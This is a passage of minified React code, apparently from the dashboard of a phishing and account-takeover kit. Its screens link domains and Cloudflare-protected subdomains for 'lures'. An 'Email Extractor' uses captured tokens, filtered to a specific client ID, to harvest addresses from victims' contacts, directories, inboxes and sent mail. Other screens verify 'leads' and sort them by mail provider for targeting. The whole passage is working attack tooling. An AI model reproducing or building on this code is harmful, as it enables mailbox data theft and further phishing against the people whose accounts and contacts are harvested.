                          children: [
                            (0, R.jsx)(rs, { children: `Domain` }),
                            (0, R.jsx)(rs, { children: `Status` }),
                            (0, R.jsx)(rs, { children: `SSL` }),
                          ],
                        }),
                      }),
                      (0, R.jsx)(`tbody`, {
                        children: e.map((e) =>
                          (0, R.jsxs)(
                            `tr`,
                            {
                              className: `border-b border-border/50 hover:bg-slate-50 transition-colors`,
                              children: [
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-5 text-[13px] font-medium`,
                                  children: e.domain,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3`,
                                  children: (0, R.jsx)(la, {
                                    status: e.status || `pending`,
                                  }),
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3`,
                                  children: (0, R.jsx)(la, {
                                    status:
                                      e.ssl_status === `active`
                                        ? `active`
                                        : e.ssl_status === `error`
                                          ? `revoked`
                                          : `pending`,
                                    label: e.ssl_status || `pending`,
                                  }),
                                }),
                              ],
                            },
                            e.id,
                          ),
                        ),
                      }),
                    ],
                  }),
            ],
          }),
        ],
      });
}
function rs({ children: e }) {
  return (0, R.jsx)(`th`, {
    className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-5 font-bold`,
    children: e,
  });
}
function is({
  onClick: e,
  children: t,
  color: n = `hover:text-slate-900 hover:bg-slate-100`,
  loading: r = !1,
}) {
  return (0, R.jsx)(`button`, {
    onClick: e,
    disabled: r,
    className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider cursor-pointer transition-colors text-text-secondary ${n} disabled:opacity-40`,
    children: r ? (0, R.jsx)(ci, { size: 12, className: `animate-spin` }) : t,
  });
}
function as({ onClose: e, onAdded: t }) {
  let [n, r] = (0, _.useState)(``),
    [i, a] = (0, _.useState)(``),
    [o, s] = (0, _.useState)(``),
    [c, l] = (0, _.useState)(``),
    [u, d] = (0, _.useState)(``),
    [f, p] = (0, _.useState)(!1),
    m = z((e) => e.add);
  async function h() {
    if (!n.trim()) {
      m(`Enter a domain`, `error`);
      return;
    }
    p(!0);
    try {
      let e = await Vo(
        n.trim(),
        i.trim() || void 0,
        o.trim() || void 0,
        c.trim() || void 0,
        u.trim() || void 0,
      );
      e.success
        ? (m(`Domain linked — now add DNS records and verify`, `success`), t())
        : m(e.error || `Failed`, `error`);
    } catch (e) {
      m(e.message || `Failed to link domain`, `error`);
    } finally {
      p(!1);
    }
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `Link Domain via DNS`,
    onClose: e,
    width: `max-w-lg`,
    children: (0, R.jsxs)(`div`, {
      className: `space-y-4`,
      children: [
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `Domain`,
            }),
            (0, R.jsx)(`input`, {
              type: `text`,
              value: n,
              onChange: (e) => r(e.target.value),
              placeholder: `yourdomain.com`,
              className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
              autoFocus: !0,
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          className: `bg-bg border border-border p-4`,
          children: [
            (0, R.jsxs)(`h4`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-3 flex items-center gap-1.5`,
              children: [
                (0, R.jsx)(Oi, { size: 12, className: `text-blue-400` }),
                ` Cloudflare Turnstile `,
                (0, R.jsx)(`span`, {
                  className: `font-normal normal-case tracking-normal`,
                  children: `(optional)`,
                }),
              ],
            }),
            (0, R.jsx)(`p`, {
              className: `text-[11px] text-text-muted mb-3`,
              children: `Add a bot challenge page before visitors reach your lure. Leave blank to disable.`,
            }),
            (0, R.jsxs)(`div`, {
              className: `space-y-2`,
              children: [
                (0, R.jsxs)(`div`, {
                  children: [
                    (0, R.jsx)(`label`, {
                      className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
                      children: `Site Key`,
                    }),
                    (0, R.jsx)(`input`, {
                      type: `text`,
                      value: i,
                      onChange: (e) => a(e.target.value),
                      placeholder: `0x4AAAAAAA...`,
                      className: `w-full bg-surface border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light font-mono`,
                    }),
                  ],
                }),
                (0, R.jsxs)(`div`, {
                  children: [
                    (0, R.jsx)(`label`, {
                      className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
                      children: `Secret Key`,
                    }),
                    (0, R.jsx)(`input`, {
                      type: `password`,
                      value: o,
                      onChange: (e) => s(e.target.value),
                      placeholder: `0x4AAAAAAA...`,
                      className: `w-full bg-surface border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light font-mono`,
                    }),
                  ],
                }),
              ],
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          className: `bg-bg border border-border p-4`,
          children: [
            (0, R.jsxs)(`h4`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-3 flex items-center gap-1.5`,
              children: [
                (0, R.jsx)($r, { size: 12, className: `text-green-400` }),
                ` Cloudflare Auto-Subdomain `,
                (0, R.jsx)(`span`, {
                  className: `font-normal normal-case tracking-normal`,
                  children: `(optional)`,
                }),
              ],
            }),
            (0, R.jsx)(`p`, {
              className: `text-[11px] text-text-muted mb-3`,
              children: `Provide your Cloudflare Zone ID and API Token to enable auto-generated subdomains when creating lures. Leave blank to skip.`,
            }),
            (0, R.jsxs)(`div`, {
              className: `space-y-2`,
              children: [
                (0, R.jsxs)(`div`, {
                  children: [
                    (0, R.jsx)(`label`, {
                      className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
                      children: `Zone ID`,
                    }),
                    (0, R.jsx)(`input`, {
                      type: `text`,
                      value: c,
                      onChange: (e) => l(e.target.value),
                      placeholder: `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`,
                      className: `w-full bg-surface border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light font-mono`,
                    }),
                  ],
                }),
                (0, R.jsxs)(`div`, {
                  children: [
                    (0, R.jsx)(`label`, {
                      className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
                      children: `API Token`,
                    }),
                    (0, R.jsx)(`input`, {
                      type: `password`,
                      value: u,
                      onChange: (e) => d(e.target.value),
                      placeholder: `CF API Token with DNS:Edit permission`,
                      className: `w-full bg-surface border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light font-mono`,
                    }),
                  ],
                }),
              ],
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          className: `flex gap-2 pt-2`,
          children: [
            (0, R.jsx)(V, {
              onClick: h,
              disabled: f,
              children: f ? `Linking...` : `Link Domain`,
            }),
            (0, R.jsx)(V, { variant: `ghost`, onClick: e, children: `Cancel` }),
          ],
        }),
      ],
    }),
  });
}
function os({ domain: e, onClose: t, onSaved: n }) {
  let [r, i] = (0, _.useState)(e.turnstile_site_key || ``),
    [a, o] = (0, _.useState)(e.turnstile_secret_key || ``),
    [s, c] = (0, _.useState)(e.cf_zone_id || ``),
    [l, u] = (0, _.useState)(e.cf_api_token || ``),
    [d, f] = (0, _.useState)(!1),
    p = z((e) => e.add);
  async function m() {
    f(!0);
    try {
      let t = await Ho(
        e.id,
        r.trim(),
        a.trim(),
        s.trim() || void 0,
        l.trim() || void 0,
      );
      t.success
        ? (p(`Domain settings updated`, `success`), n())
        : p(t.error || `Failed to update`, `error`);
    } catch {
      p(`Failed to update domain settings`, `error`);
    } finally {
      f(!1);
    }
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `Domain Settings — ${e.domain}`,
    onClose: t,
    width: `max-w-md`,
    children: (0, R.jsxs)(`div`, {
      className: `space-y-4`,
      children: [
        (0, R.jsxs)(`div`, {
          className: `bg-bg border border-border p-4`,
          children: [
            (0, R.jsxs)(`h4`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-3 flex items-center gap-1.5`,
              children: [
                (0, R.jsx)(Oi, { size: 12, className: `text-blue-400` }),
                ` Cloudflare Turnstile`,
              ],
            }),
            (0, R.jsx)(`p`, {
              className: `text-xs text-text-muted mb-3`,
              children: `Bot protection for this domain. Leave blank to disable.`,
            }),
            (0, R.jsxs)(`div`, {
              className: `space-y-2`,
              children: [
                (0, R.jsxs)(`div`, {
                  children: [
                    (0, R.jsx)(`label`, {
                      className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
                      children: `Site Key`,
                    }),
                    (0, R.jsx)(`input`, {
                      type: `text`,
                      value: r,
                      onChange: (e) => i(e.target.value),
                      placeholder: `0x4AAAAAAA...`,
                      className: `w-full bg-surface border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light font-mono`,
                      autoFocus: !0,
                    }),
                  ],
                }),
                (0, R.jsxs)(`div`, {
                  children: [
                    (0, R.jsx)(`label`, {
                      className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
                      children: `Secret Key`,
                    }),
                    (0, R.jsx)(`input`, {
                      type: `password`,
                      value: a,
                      onChange: (e) => o(e.target.value),
                      placeholder: `0x4AAAAAAA...`,
                      className: `w-full bg-surface border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light font-mono`,
                    }),
                  ],
                }),
                r &&
                  (0, R.jsxs)(`div`, {
                    className: `flex items-center gap-1.5 text-[11px] text-active`,
                    children: [
                      (0, R.jsx)(Oi, { size: 11 }),
                      ` Turnstile active`,
                    ],
                  }),
                !r &&
                  e.turnstile_site_key &&
                  (0, R.jsxs)(`div`, {
                    className: `flex items-center gap-1.5 text-[11px] text-yellow-500`,
                    children: [
                      (0, R.jsx)(L, { size: 11 }),
                      ` Clearing site key will disable Turnstile`,
                    ],
                  }),
              ],
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          className: `bg-bg border border-border p-4`,
          children: [
            (0, R.jsxs)(`h4`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-3 flex items-center gap-1.5`,
              children: [
                (0, R.jsx)($r, { size: 12, className: `text-green-400` }),
                ` Cloudflare Auto-Subdomain`,
              ],
            }),
            (0, R.jsx)(`p`, {
              className: `text-xs text-text-muted mb-3`,
              children: `Zone ID and API Token for auto-generating subdomains on this domain when creating lures.`,
            }),
            (0, R.jsxs)(`div`, {
              className: `space-y-2`,
              children: [
                (0, R.jsxs)(`div`, {
                  children: [
                    (0, R.jsx)(`label`, {
                      className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
                      children: `Zone ID`,
                    }),
                    (0, R.jsx)(`input`, {
                      type: `text`,
                      value: s,
                      onChange: (e) => c(e.target.value),
                      placeholder: `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`,
                      className: `w-full bg-surface border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light font-mono`,
                    }),
                  ],
                }),
                (0, R.jsxs)(`div`, {
                  children: [
                    (0, R.jsx)(`label`, {
                      className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
                      children: `API Token`,
                    }),
                    (0, R.jsx)(`input`, {
                      type: `password`,
                      value: l,
                      onChange: (e) => u(e.target.value),
                      placeholder: `CF API Token with DNS:Edit permission`,
                      className: `w-full bg-surface border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light font-mono`,
                    }),
                  ],
                }),
                s &&
                  l &&
                  (0, R.jsxs)(`div`, {
                    className: `flex items-center gap-1.5 text-[11px] text-active`,
                    children: [
                      (0, R.jsx)($r, { size: 11 }),
                      ` Auto-subdomain enabled`,
                    ],
                  }),
              ],
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          className: `flex gap-2 pt-2`,
          children: [
            (0, R.jsx)(V, {
              onClick: m,
              disabled: d,
              children: d ? `Saving...` : `Save`,
            }),
            (0, R.jsx)(V, { variant: `ghost`, onClick: t, children: `Cancel` }),
          ],
        }),
      ],
    }),
  });
}
async function ss(e) {
  return P(`/dash/contacts/${e}/harvest/start`, { method: `POST` });
}
async function cs(e, t) {
  return P(`/dash/contacts/${e}/harvest/status/${t}`);
}
async function ls(e, t) {
  return P(`/dash/contacts/${e}/harvest/cancel/${t}`, { method: `POST` });
}
async function us(e) {
  return P(`/dash/contacts/verify-emails`, {
    method: `POST`,
    body: JSON.stringify({ emails: e }),
  });
}
async function ds(e) {
  return P(`/dash/contacts/classify-domains`, {
    method: `POST`,
    body: JSON.stringify({ domains: e }),
  });
}
var fs = `panel_active_harvests`;
function ps() {
  try {
    return JSON.parse(localStorage.getItem(fs) || `{}`);
  } catch {
    return {};
  }
}
function ms(e, t) {
  let n = ps();
  ((n[e] = t), localStorage.setItem(fs, JSON.stringify(n)));
}
function hs(e) {
  let t = ps();
  (delete t[e], localStorage.setItem(fs, JSON.stringify(t)));
}
var gs = new Set(
    `gmail.com,googlemail.com,outlook.com,hotmail.com,live.com,msn.com,outlook.co.uk,hotmail.co.uk,live.co.uk,yahoo.com,yahoo.co.uk,yahoo.ca,aol.com,ymail.com,icloud.com,me.com,mac.com,protonmail.com,proton.me,zoho.com,yandex.com,gmx.com,gmx.net,mail.ru,qq.com,163.com,comcast.net,att.net,sbcglobal.net,bellsouth.net,charter.net,cox.net,rocketmail.com,rediffmail.com,tutanota.com,web.de,t-online.de,orange.fr,libero.it,wp.pl,onet.pl,rambler.ru,naver.com,hanmail.net`.split(
      `,`,
    ),
  ),
  _s =
    /^(no[-_.]?reply|donotreply|mailer[-_.]?daemon|postmaster|noreply|notification[s]?|alert[s]?|automated|system|bounce)/i,
  vs = {
    office365: {
      label: `Office 365`,
      color: `text-blue-400`,
      bg: `bg-blue-500/15`,
      border: `border-blue-500/20`,
    },
    gsuite: {
      label: `Google Workspace`,
      color: `text-green-400`,
      bg: `bg-green-500/15`,
      border: `border-green-500/20`,
    },
    godaddy: {
      label: `GoDaddy`,
      color: `text-orange-400`,
      bg: `bg-orange-500/15`,
      border: `border-orange-500/20`,
    },
    rackspace: {
      label: `Rackspace`,
      color: `text-pink-400`,
      bg: `bg-pink-500/15`,
      border: `border-pink-500/20`,
    },
    gateway: {
      label: `Secure Gateway`,
      color: `text-yellow-400`,
      bg: `bg-yellow-500/15`,
      border: `border-yellow-500/20`,
    },
    yahoo: {
      label: `Yahoo`,
      color: `text-purple-400`,
      bg: `bg-purple-500/15`,
      border: `border-purple-500/20`,
    },
    zoho: {
      label: `Zoho`,
      color: `text-red-400`,
      bg: `bg-red-500/15`,
      border: `border-red-500/20`,
    },
    consumer: {
      label: `Consumer`,
      color: `text-neutral-400`,
      bg: `bg-neutral-500/10`,
      border: `border-neutral-500/20`,
    },
    noreply: {
      label: `No-Reply`,
      color: `text-neutral-500`,
      bg: `bg-neutral-500/10`,
      border: `border-neutral-600/20`,
    },
    other: {
      label: `Other`,
      color: `text-neutral-400`,
      bg: `bg-slate-50`,
      border: `border-border`,
    },
    unknown: {
      label: `Unknown`,
      color: `text-neutral-500`,
      bg: `bg-slate-50`,
      border: `border-border`,
    },
  };
function ys() {
  let [e, t] = (0, _.useState)([]),
    [n, r] = (0, _.useState)(null),
    i = z((e) => e.add);
  return (
    (0, _.useEffect)(() => {
      Wa()
        .then((e) => {
          let i = e.filter(
            (e) =>
              e.status === `active` &&
              e.client_id?.toLowerCase().startsWith(`d3590ed6`),
          );
          (t(i), i.length > 0 && !n && r(i[0].id));
        })
        .catch(() => i(`Failed to load tokens`, `error`));
    }, []),
    (0, R.jsxs)(`div`, {
      children: [
        (0, R.jsxs)(`div`, {
          className: `flex items-center justify-between mb-6`,
          children: [
            (0, R.jsx)(`h1`, {
              className: `text-lg font-bold tracking-wider uppercase`,
              children: `Email Extractor`,
            }),
            (0, R.jsx)(bs, { tokens: e, selected: n, onSelect: r }),
          ],
        }),
        n
          ? (0, R.jsx)(xs, { tid: n }, n)
          : (0, R.jsx)(Ts, {
              text: `Select an active token to extract emails.`,
            }),
      ],
    })
  );
}
function bs({ tokens: e, selected: t, onSelect: n }) {
  let [r, i] = (0, _.useState)(!1);
  return (0, R.jsxs)(`div`, {
    className: `relative`,
    children: [
      (0, R.jsxs)(`button`, {
        onClick: () => i(!r),
        className: `flex items-center gap-2 bg-surface border border-border px-3 py-2 text-sm cursor-pointer hover:border-border-light transition-colors min-w-[240px]`,
        children: [
          (0, R.jsx)(`span`, {
            className: `truncate flex-1 text-left`,
            children:
              e.find((e) => e.id === t)?.user_email ?? `Select token...`,
          }),
          (0, R.jsx)(Mr, {
            size: 14,
            className: `text-text-muted transition-transform ${r ? `rotate-180` : ``}`,
          }),
        ],
      }),
      r &&
        (0, R.jsxs)(`div`, {
          className: `absolute right-0 top-full mt-1 w-[320px] bg-surface border border-border z-30 max-h-64 overflow-y-auto shadow-lg`,
          children: [
            e.length === 0 &&
              (0, R.jsx)(`div`, {
                className: `px-3 py-4 text-xs text-text-muted text-center`,
                children: `No active tokens`,
              }),
            e.map((e) =>
              (0, R.jsx)(
                `button`,
                {
                  onClick: () => {
                    (n(e.id), i(!1));
                  },
                  className: `w-full text-left px-3 py-2 text-sm hover:bg-surface-hover cursor-pointer transition-colors flex items-center gap-2 ${e.id === t ? `bg-slate-100 text-slate-900` : `text-text-secondary`}`,
                  children: (0, R.jsx)(`span`, {
                    className: `truncate`,
                    children: e.user_email,
                  }),
                },
                e.id,
              ),
            ),
          ],
        }),
    ],
  });
}
function xs({ tid: e }) {
  let [t, n] = (0, _.useState)(() => ps()[e] || null),
    [r, i] = (0, _.useState)(null),
    [a, o] = (0, _.useState)(!1),
    [s, c] = (0, _.useState)(``),
    [l, u] = (0, _.useState)(!1),
    [d, f] = (0, _.useState)(!1),
    [p, m] = (0, _.useState)(`all`),
    [h, g] = (0, _.useState)({}),
    [v, y] = (0, _.useState)(!1),
    [b, x] = (0, _.useState)({ done: 0, total: 0 }),
    S = (0, _.useRef)(!1),
    [C, w] = (0, _.useState)({}),
    [ee, T] = (0, _.useState)(!1),
    [E, D] = (0, _.useState)({ done: 0, total: 0 }),
    te = (0, _.useRef)(!1),
    ne = (0, _.useRef)(null),
    O = z((e) => e.add),
    re = (0, _.useCallback)(() => {
      ne.current &&= (clearInterval(ne.current), null);
    }, []),
    k = (0, _.useCallback)(
      (t) => {
        (re(),
          (ne.current = setInterval(async () => {
            try {
              let n = await cs(e, t);
              (i(n),
                (n.status === `done` || n.status === `cancelled`) &&
                  (re(), hs(e)));
            } catch {
              re();
            }
          }, 2e3)));
      },
      [e, re],
    );
  (0, _.useEffect)(
    () => (
      t &&
        (f(!0),
        cs(e, t)
          .then((n) => {
            (i(n), n.status === `running` ? k(t) : hs(e));
          })
          .catch(() => {
            (n(null), hs(e));
          })
          .finally(() => f(!1))),
      re
    ),
    [e, t, k, re],
  );
  async function ie() {
    (o(!0), g({}), w({}), m(`all`));
    try {
      let t = await ss(e);
      (n(t.job_id),
        ms(e, t.job_id),
        i({
          status: `running`,
          phase: `starting`,
          phase_label: `Starting...`,
          sources_done: 0,
          running_total: 0,
          msgs_scanned: 0,
          folder_total: 0,
          folder_done: 0,
          current_folder: ``,
          account: ``,
        }),
        k(t.job_id));
    } catch (e) {
      O(e.message || `Failed to start harvest`, `error`);
    } finally {
      o(!1);
    }
  }
  async function ae() {
    if (t)
      try {
        (i({ ...(await ls(e, t)), status: `done` }),
          re(),
          hs(e),
          O(`Stopped — partial results saved`, `success`));
      } catch {
        O(`Failed to cancel`, `error`);
      }
  }
  function A() {
    (n(null), i(null), g({}), w({}), m(`all`), hs(e));
  }
  async function j() {
    let e = r?.results ?? r?.preview ?? [],
      t = new Set();
    e.forEach((e) => {
      let n = e.email.split(`@`)[1]?.toLowerCase();
      n && !gs.has(n) && t.add(n);
    });
    let n = Array.from(t);
    if (!n.length) {
      O(`No business domains to classify`, `error`);
      return;
    }
    (y(!0), (S.current = !1), x({ done: 0, total: n.length }));
    for (let e = 0; e < n.length && !S.current; e += 30) {
      let t = n.slice(e, e + 30);
      try {
        let e = await ds(t);
        g((t) => {
          let n = { ...t };
          for (let t of e) n[t.domain] = t;
          return n;
        });
      } catch {}
      x({ done: Math.min(e + 30, n.length), total: n.length });
    }
    (y(!1), S.current || O(`Domain classification complete`, `success`));
  }
  async function oe() {
    let e = de().map((e) => e.email);
    if (e.length) {
      (T(!0), (te.current = !1), D({ done: 0, total: e.length }));
      for (let t = 0; t < e.length && !te.current; t += 50) {
        let n = e.slice(t, t + 50);
        try {
          let e = await us(n);
          w((t) => {
            let n = { ...t };
            for (let t of e) n[t.email.toLowerCase()] = t;
            return n;
          });
        } catch {}
        D({ done: Math.min(t + 50, e.length), total: e.length });
      }
      (T(!1), te.current || O(`Verification complete`, `success`));
    }
  }
  let se = r?.status === `running`,
    ce = r?.status === `done` || r?.status === `cancelled`,
    le = ce ? (r?.results ?? []) : (r?.preview ?? []),
    M = Object.keys(h).length > 0,
    N = Object.keys(C).length > 0;
  function ue(e) {
    let t = e.split(`@`)[1]?.toLowerCase() || ``;
    if (gs.has(t)) return `consumer`;
    let n = e.split(`@`)[0]?.toLowerCase() || ``;
    return _s.test(n) ? `noreply` : (M && h[t]?.provider) || `unknown`;
  }
  function de() {
    return le.filter((e) => {
      if (s) {
        let t = s.toLowerCase();
        if (
          !e.email.toLowerCase().includes(t) &&
          !(e.name || ``).toLowerCase().includes(t)
        )
          return !1;
      }
      return p === `all`
        ? !0
        : p === `valid`
          ? C[e.email.toLowerCase()]?.valid === !0
          : p === `invalid`
            ? C[e.email.toLowerCase()]?.valid === !1
            : ue(e.email) === p;
    });
  }
  let fe = de(),
    pe = {};
  le.forEach((e) => {
    let t = ue(e.email);
    pe[t] = (pe[t] || 0) + 1;
  });
  let me = Object.values(C).filter((e) => e.valid === !0).length,
    he = Object.values(C).filter((e) => e.valid === !1).length;
  function ge() {
    let e = fe.map((e) => e.email).join(`
`),
      t = new Blob([e], { type: `text/plain` }),
      n = document.createElement(`a`);
    ((n.href = URL.createObjectURL(t)),
      (n.download = `extracted_${p}_${r?.account || `export`}.txt`),
      n.click(),
      URL.revokeObjectURL(n.href),
      O(`Exported ${fe.length} emails`, `success`));
  }
  function _e() {
    (navigator.clipboard.writeText(
      fe.map((e) => e.email).join(`
`),
    ),
      u(!0),
      setTimeout(() => u(!1), 2e3),
      O(`Copied ${fe.length} emails`, `success`));
  }
  return d
    ? (0, R.jsx)(Es, { text: `Reconnecting to harvest job...` })
    : (0, R.jsxs)(`div`, {
        children: [
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-4 mb-4`,
            children: [
              (0, R.jsxs)(`div`, {
                className: `flex items-center justify-between mb-3`,
                children: [
                  (0, R.jsxs)(`div`, {
                    children: [
                      (0, R.jsx)(`h3`, {
                        className: `text-sm font-bold uppercase tracking-wider`,
                        children: `Email Extractor`,
                      }),
                      (0, R.jsx)(`p`, {
                        className: `text-xs text-text-muted mt-1`,
                        children: `Scans contacts, People API, org directory, inbox & sent items. No message limit — runs until done.`,
                      }),
                    ],
                  }),
                  (0, R.jsxs)(`div`, {
                    className: `flex gap-2`,
                    children: [
                      ce &&
                        (0, R.jsx)(V, {
                          variant: `secondary`,
                          size: `sm`,
                          onClick: A,
                          children: `New Extraction`,
                        }),
                      !se &&
                        !ce &&
                        (0, R.jsx)(V, {
                          onClick: ie,
                          disabled: a,
                          size: `sm`,
                          children: (0, R.jsxs)(`span`, {
                            className: `flex items-center gap-1.5`,
                            children: [
                              (0, R.jsx)(gi, { size: 12 }),
                              ` `,
                              a ? `Starting...` : `Start Extraction`,
                            ],
                          }),
                        }),
                      se &&
                        (0, R.jsx)(V, {
                          variant: `danger`,
                          onClick: ae,
                          size: `sm`,
                          children: (0, R.jsxs)(`span`, {
                            className: `flex items-center gap-1.5`,
                            children: [
                              (0, R.jsx)(ji, { size: 12 }),
                              ` Stop & Save`,
                            ],
                          }),
                        }),
                    ],
                  }),
                ],
              }),
              r &&
                (0, R.jsxs)(`div`, {
                  className: `space-y-2`,
                  children: [
                    (0, R.jsxs)(`div`, {
                      className: `flex items-center gap-3 text-xs flex-wrap`,
                      children: [
                        se &&
                          (0, R.jsx)(ci, {
                            size: 12,
                            className: `animate-spin text-text-muted`,
                          }),
                        (0, R.jsx)(la, {
                          color: se ? `warning` : `success`,
                          children: r.phase_label || r.phase || r.status,
                        }),
                        (0, R.jsxs)(`span`, {
                          className: `text-text-muted font-mono`,
                          children: [
                            (r.running_total || 0).toLocaleString(),
                            ` emails`,
                          ],
                        }),
                        (0, R.jsxs)(`span`, {
                          className: `text-text-muted font-mono`,
                          children: [
                            (r.msgs_scanned || 0).toLocaleString(),
                            ` msgs scanned`,
                          ],
                        }),
                      ],
                    }),
                    se &&
                      (0, R.jsx)(`div`, {
                        className: `h-1 bg-bg rounded-full overflow-hidden`,
                        children: (0, R.jsx)(`div`, {
                          className: `h-full bg-slate-500 transition-all duration-500 animate-pulse`,
                          style: {
                            width: `${r.sources_done ? Math.round((r.sources_done / 4) * 100) : 10}%`,
                          },
                        }),
                      }),
                  ],
                }),
            ],
          }),
          ce &&
            le.length > 0 &&
            (0, R.jsxs)(`div`, {
              className: `flex gap-3 mb-4`,
              children: [
                (0, R.jsxs)(`div`, {
                  className: `flex-1 bg-surface border border-border p-3`,
                  children: [
                    (0, R.jsxs)(`div`, {
                      className: `flex items-center justify-between`,
                      children: [
                        (0, R.jsxs)(`div`, {
                          className: `flex items-center gap-2`,
                          children: [
                            (0, R.jsx)(kr, {
                              size: 14,
                              className: `text-blue-400`,
                            }),
                            (0, R.jsx)(`span`, {
                              className: `text-xs font-bold uppercase tracking-wider`,
                              children: `Sort by Provider`,
                            }),
                            M &&
                              (0, R.jsxs)(`span`, {
                                className: `text-[10px] text-text-muted`,
                                children: [
                                  `(`,
                                  Object.keys(h).length,
                                  ` domains classified)`,
                                ],
                              }),
                          ],
                        }),
                        v
                          ? (0, R.jsx)(V, {
                              variant: `danger`,
                              size: `sm`,
                              onClick: () => {
                                ((S.current = !0), y(!1));
                              },
                              children: (0, R.jsxs)(`span`, {
                                className: `flex items-center gap-1.5`,
                                children: [
                                  (0, R.jsx)(ji, { size: 12 }),
                                  ` Stop`,
                                ],
                              }),
                            })
                          : (0, R.jsx)(V, {
                              size: `sm`,
                              onClick: j,
                              disabled: v,
                              children: (0, R.jsxs)(`span`, {
                                className: `flex items-center gap-1.5`,
                                children: [
                                  (0, R.jsx)(bi, { size: 12 }),
                                  ` `,
                                  M ? `Re-scan` : `Classify`,
                                ],
                              }),
                            }),
                      ],
                    }),
                    v &&
                      (0, R.jsxs)(`div`, {
                        className: `mt-2`,
                        children: [
                          (0, R.jsxs)(`div`, {
                            className: `flex items-center gap-2 text-xs text-text-muted`,
                            children: [
                              (0, R.jsx)(ci, {
                                size: 12,
                                className: `animate-spin`,
                              }),
                              ` `,
                              b.done,
                              `/`,
                              b.total,
                              ` domains...`,
                            ],
                          }),
                          (0, R.jsx)(`div`, {
                            className: `h-1 bg-bg rounded-full overflow-hidden mt-1`,
                            children: (0, R.jsx)(`div`, {
                              className: `h-full bg-blue-500 transition-all`,
                              style: {
                                width: `${b.total > 0 ? Math.round((b.done / b.total) * 100) : 0}%`,
                              },
                            }),
                          }),
                        ],
                      }),
                  ],
                }),
                (0, R.jsxs)(`div`, {
                  className: `flex-1 bg-surface border border-border p-3`,
                  children: [
                    (0, R.jsxs)(`div`, {
                      className: `flex items-center justify-between`,
                      children: [
                        (0, R.jsxs)(`div`, {
                          className: `flex items-center gap-2`,
                          children: [
                            (0, R.jsx)(Ei, {
                              size: 14,
                              className: `text-emerald-400`,
                            }),
                            (0, R.jsx)(`span`, {
                              className: `text-xs font-bold uppercase tracking-wider`,
                              children: `Verify Leads`,
                            }),
                            N &&
                              (0, R.jsxs)(`span`, {
                                className: `text-[10px] text-emerald-400`,
                                children: [me, ` live`],
                              }),
                          ],
                        }),
                        ee
                          ? (0, R.jsx)(V, {
                              variant: `danger`,
                              size: `sm`,
                              onClick: () => {
                                ((te.current = !0), T(!1));
                              },
                              children: (0, R.jsxs)(`span`, {
                                className: `flex items-center gap-1.5`,
                                children: [
                                  (0, R.jsx)(ji, { size: 12 }),
                                  ` Stop`,
                                ],
                              }),
                            })
                          : (0, R.jsx)(V, {
                              size: `sm`,
                              onClick: oe,
                              disabled: ee,
                              children: (0, R.jsxs)(`span`, {
                                className: `flex items-center gap-1.5`,
                                children: [
                                  (0, R.jsx)(Ei, { size: 12 }),
                                  ` `,
                                  N ? `Re-verify` : `Verify`,
                                ],
                              }),
                            }),
                      ],
                    }),
                    ee &&
                      (0, R.jsxs)(`div`, {
                        className: `mt-2`,
                        children: [
                          (0, R.jsxs)(`div`, {
                            className: `flex items-center gap-2 text-xs text-text-muted`,
                            children: [
                              (0, R.jsx)(ci, {
                                size: 12,
                                className: `animate-spin`,
                              }),
                              ` `,
                              E.done,
                              `/`,
                              E.total,
                              ` emails...`,
                            ],
                          }),
                          (0, R.jsx)(`div`, {
                            className: `h-1 bg-bg rounded-full overflow-hidden mt-1`,
                            children: (0, R.jsx)(`div`, {
                              className: `h-full bg-emerald-500 transition-all`,
                              style: {
                                width: `${E.total > 0 ? Math.round((E.done / E.total) * 100) : 0}%`,
                              },
                            }),
                          }),
                        ],
                      }),
                  ],
                }),
              ],
            }),
          le.length > 0 &&
            (0, R.jsxs)(R.Fragment, {
              children: [
                (M || N) &&
                  (0, R.jsxs)(`div`, {
                    className: `flex items-center gap-1 mb-3 flex-wrap`,
                    children: [
                      (0, R.jsx)(Ss, {
                        active: p === `all`,
                        onClick: () => m(`all`),
                        label: `All`,
                        count: le.length,
                      }),
                      M &&
                        (0, R.jsxs)(R.Fragment, {
                          children: [
                            (pe.office365 || 0) > 0 &&
                              (0, R.jsx)(Ss, {
                                active: p === `office365`,
